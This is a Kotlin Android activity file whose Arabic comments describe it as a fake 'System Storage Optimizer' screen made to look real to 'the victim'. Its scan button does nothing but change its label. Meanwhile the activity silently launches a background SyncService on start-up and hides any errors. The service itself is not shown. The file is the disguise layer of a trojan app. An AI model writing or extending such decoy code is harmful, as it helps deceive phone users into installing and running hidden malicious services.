package com.assets.service

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.Color
import android.view.Gravity

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // بناء واجهة تمويه وهمية كأداة تحسين النظام لتبدو حقيقية تماماً للضحية
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#F5F6F8"))
            setPadding(40, 40, 40, 40)
        }

        val titleView = TextView(this).apply {
            text = "⚙️ System Storage Optimizer"
            textSize = 20f
            setTextColor(Color.parseColor("#222222"))
            gravity = Gravity.CENTER
        }

        val descView = TextView(this).apply {
            text = "التطبيق جاهز لتحليل المخلفات وتسريع ذاكرة التخزين المؤقت."
            textSize = 14f
            setTextColor(Color.parseColor("#666666"))
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 40)
        }

        val scanButton = Button(this).apply {
            text = "فحص وتحسين النظام الآن"
            setBackgroundColor(Color.parseColor("#007AFF"))
            setTextColor(Color.WHITE)
            setOnClickListener {
                text = "جاري تحسين الذاكرة التنفيذية..."
                isEnabled = false
            }
        }

        layout.addView(titleView)
        layout.addView(descView)
        layout.addView(scanButton)
        setContentView(layout)

        // إطلاق الخدمة الخلفية بأمان تام يتوافق مع أندرويد 14+
        try {
            val serviceIntent = Intent(this, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Throwable) {}
    }
}
